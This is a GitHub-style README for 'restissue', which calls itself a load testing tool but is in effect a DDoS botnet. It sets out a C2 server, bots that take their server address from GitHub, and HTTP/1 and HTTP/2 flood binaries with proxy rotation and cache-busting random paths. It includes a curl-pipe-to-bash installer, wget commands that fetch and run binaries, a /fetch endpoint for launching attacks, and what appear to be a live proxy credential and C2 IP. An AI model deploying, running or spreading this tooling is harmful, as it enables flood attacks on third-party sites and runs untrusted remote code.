# restissue

Distributed load testing tool with C2 server, HTTP/1 (`tls-raw`) and HTTP/2 + proxy (`tls-fler`) methods.

---

## Methods

| Binary | Method | Protocol | Proxy |
|--------|--------|----------|-------|
| `./up` | `tls-raw` | HTTP/1 + TLS (fasthttp) | No |
| `./tls-fler` | `tls-fler` | HTTP/2 + TLS | Yes (auto-rotate from `proxy/global.txt`) |

---

## Setup

### One-liner install (all at once)

```bash
bash <(curl -fsSL https://raw.githubusercontent.com/malasahjagotwin/restissue/refs/heads/master/setup.sh)
```

This will automatically download `bot`, `up`, `tls-fler`, and `proxy/global.txt` then set the correct permissions.

---

### Manual

```bash
# bot (C2 client)
wget https://github.com/malasahjagotwin/restissue/raw/refs/heads/master/bin/bot -O bot && chmod +x bot

# tls-raw (HTTP/1)
wget https://github.com/malasahjagotwin/restissue/raw/refs/heads/master/bin/up -O up && chmod +x up

# tls-fler (HTTP/2 + proxy)
wget https://github.com/malasahjagotwin/restissue/raw/refs/heads/master/bin/tls-fler -O tls-fler && chmod +x tls-fler

# proxy list
mkdir -p proxy && wget https://raw.githubusercontent.com/malasahjagotwin/restissue/refs/heads/master/proxy/global.txt -O proxy/global.txt
```

> `tls-fler` automatically checks & updates `proxy/global.txt` from GitHub every 30 seconds if there are any changes.

---

## Running

### Bot (C2 client)

No flags required. The server IP:port is fetched automatically from GitHub (`server/addr.txt`) and the bot will auto-reconnect whenever it changes.

```bash
./bot
```

The bot polls `server/addr.txt` every 15 seconds. If the address changes, it disconnects and reconnects to the new server automatically.

---

### tls-raw (HTTP/1)

```bash
./up <host> <duration_seconds> <rate>
```

```bash
# Example
./up https://example.com 60 50000
```

---

### tls-fler (HTTP/2 + proxy rotation)

```bash
./tls-fler <host> <duration_seconds> <rate>
```

```bash
# Example
./tls-fler https://example.com 60 50000
```

Supports `%RAND%` placeholder in the URL path — replaced with a random string on every request:

```bash
./tls-fler https://example.com/%RAND% 60 50000
```

---

## C2 Server

### Start the server

```bash
./server -p <port>
```

```bash
# Example
./server -p 8080
```

### Trigger via /fetch

```bash
curl "http://<server_ip>:<port>/fetch?host=https://example.com&duration=60&method=tls-raw"
```

Response:
```json
{
  "host": "https://example.com",
  "duration": "60",
  "method": "tls-raw",
  "bots_sent": 5,
  "bots_online": 5
}
```

---

## Update Proxy

Edit `proxy/global.txt` on GitHub and commit. Any running `tls-fler` instance will detect the change and update its proxy list within 30 seconds.

Proxy format (`ip:port:user:pass`):
```
31.59.20.176:6754:znepvsaz:nxvdfiogh158
```

---

## Update Server Address

Edit `server/addr.txt` on GitHub and commit. All running bots will automatically reconnect to the new server within 15 seconds.

Format (`ip:port`):
```
23.156.136.115:3071
```
